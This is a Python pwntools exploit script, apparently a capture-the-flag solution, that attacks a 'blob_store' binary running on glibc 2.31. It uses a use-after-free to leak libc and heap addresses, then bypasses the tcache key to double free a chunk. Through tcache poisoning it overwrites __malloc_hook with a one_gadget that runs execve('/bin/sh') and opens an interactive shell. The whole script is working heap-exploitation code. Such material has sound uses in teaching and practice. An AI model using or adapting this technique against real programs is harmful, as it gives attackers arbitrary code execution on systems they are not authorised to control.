#!/usr/bin/env python3

from pwn import *

exe = ELF("./blob_store_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r, gdbscript="b malloc")
    else:
        r = remote("addr", 1337)

    return r

def exit(r):
    pass

def add_key(r, key, size, data):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", key)
    r.sendlineafter(b"> ", str(size).encode())
    r.sendlineafter(b"> ", data)
    pass

def show_blob(r, key):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", key)
    pass

def modify_blob(r, key, data):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"> ", key)
    r.sendlineafter(b"> ", data)
    pass    

def remove_blob(r, key):
    r.sendlineafter(b"> ", b"5")
    r.sendlineafter(b"> ", key)
    pass

def main():
    r = conn()

    add_key(r, b"key1", 2024, b"A"*2023)
    add_key(r, b"key2", 2024, b"A"*2023) # force into unsorted bin so we can leak libc
    remove_blob(r, b"key1")
    show_blob(r, b"\x00ey1")
    r.recvuntil(b"Blob:\n")
    r.recv(8)
    
    leaked_libc = r.recv(8).strip(b"\n").ljust(8, b"\x00")
    libc_base_offset = 0x70e23ab9cbe0 - 0x000070e23a9b0000
    leaked_addr_libc = u64(leaked_libc)
    log.success(f"Leaked address: {hex(leaked_addr_libc)}")
    libc.address = leaked_addr_libc - libc_base_offset
    log.success(f"Libc base: {hex(libc.address)}")
    log.info(f'malloc hook @ {hex(libc.sym.__malloc_hook)}')

    size = 100
    add_key(r, b"key3", size, b"A"*(size-1)) # create onto the tcache
    remove_blob(r, b"key3")
    show_blob(r, b"\x00ey3")
    r.recvuntil(b"Blob:\n")
    r.recv(8)

    leaked_heap = r.recv(8).strip(b"\n").ljust(8, b"\x00")
    libc_base_offset = 0x6432c0257010 - 0x00006432c0257000
    leaked_addr_heap = u64(leaked_heap)
    log.success(f"Leaked address: {hex(leaked_addr_heap)}")
    heap_base = leaked_addr_heap - libc_base_offset
    tcache_start = heap_base + 0x10

    one_gadget = 0xe3afe + libc.address # execve("/bin/sh", r15, r12)

    log.success(f"One gadget: {hex(one_gadget)}")

    log.success(f"heap base: {hex(heap_base)}")
    modify_blob(r, b"\x00ey3", p64(0x0) + p64(tcache_start + 0x20) + b"F"*(size-17)) # overwrite tcache key so we can double free
    remove_blob(r, b"\x00ey3")
    modify_blob(r, b"\x00ey3", p64(libc.sym.__malloc_hook) + p64(tcache_start) + b"F"*(size-17)) # after next allocation we will get malloc hook

    add_key(r, b"key4", size, b"A"*(size-1))
    add_key(r, b"key5", size, p64(one_gadget) + p64(one_gadget) + b"A"*(size-17)) # overwrite malloc hook with one_gadget

    # trigger malloc
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", b"key6")
    r.sendlineafter(b"> ", b"0") # to set r12 to 0 so one_gadget works
    r.interactive()


if __name__ == "__main__":
    main()
